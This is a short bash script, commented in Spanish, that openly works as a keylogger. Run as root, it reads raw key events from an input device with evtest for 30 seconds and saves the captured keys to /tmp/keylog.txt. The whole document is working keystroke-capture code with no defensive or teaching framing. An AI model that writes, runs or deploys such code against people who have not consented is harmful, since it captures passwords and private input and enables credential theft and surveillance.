#!/bin/bash

LOG_FILE="/tmp/keylog.txt"
DEVICE="/dev/input/event3"  # Reemplázalo con el ID correcto

# Verifica que el script se ejecute como root
if [[ $EUID -ne 0 ]]; then
   echo "Este script debe ejecutarse como root"
   exit 1
fi

echo "[*] Iniciando captura de teclas por 30 segundos..." > "$LOG_FILE"

# Captura teclas en segundo plano y las guarda en archivo
evtest "$DEVICE" | awk '/EV_KEY/ {print $NF}' >> "$LOG_FILE" &
PID=$!

# Espera 30 segundos antes de detener la captura
sleep 30
kill $PID

echo "[*] Captura finalizada. Archivo guardado en $LOG_FILE"
